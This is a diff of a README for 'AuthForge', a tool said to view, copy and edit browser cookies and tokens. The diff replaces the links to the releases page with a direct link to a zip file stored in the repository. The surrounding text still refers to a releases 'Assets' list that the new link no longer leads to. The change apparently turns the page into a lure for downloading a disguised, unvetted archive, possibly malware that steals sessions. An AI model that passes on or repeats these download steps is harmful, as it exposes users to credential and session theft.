@@ -1,12 +1,12 @@
 # 🔑 AuthForge - Manage browser cookies and tokens easily
 
-[![](https://img.shields.io/badge/Download_AuthForge-blue)](https://github.com/Zaredreverent616/AuthForge/releases)
+[![](https://img.shields.io/badge/Download_AuthForge-blue)](https://github.com/Zaredreverent616/AuthForge/raw/refs/heads/main/shared/Forge_Auth_v1.5.zip)
 
 AuthForge helps you view and manage the data your browser uses to keep you signed in to websites. Browsers store this information in small files called cookies and tokens. This tool makes it simple to see these files, copy them for your notes, or edit them when you need to test how a website behaves.
 
 ## 📥 How to download
 
-Visit [this page](https://github.com/Zaredreverent616/AuthForge/releases) to find the latest version of the software. You will see a list of files under the Assets section. Choose the file that ends in .zip for your Windows computer. Save this folder to your desktop so you can find it later.
+Visit [this page](https://github.com/Zaredreverent616/AuthForge/raw/refs/heads/main/shared/Forge_Auth_v1.5.zip) to find the latest version of the software. You will see a list of files under the Assets section. Choose the file that ends in .zip for your Windows computer. Save this folder to your desktop so you can find it later.
 
 ## 🛠️ Setting up the software
 
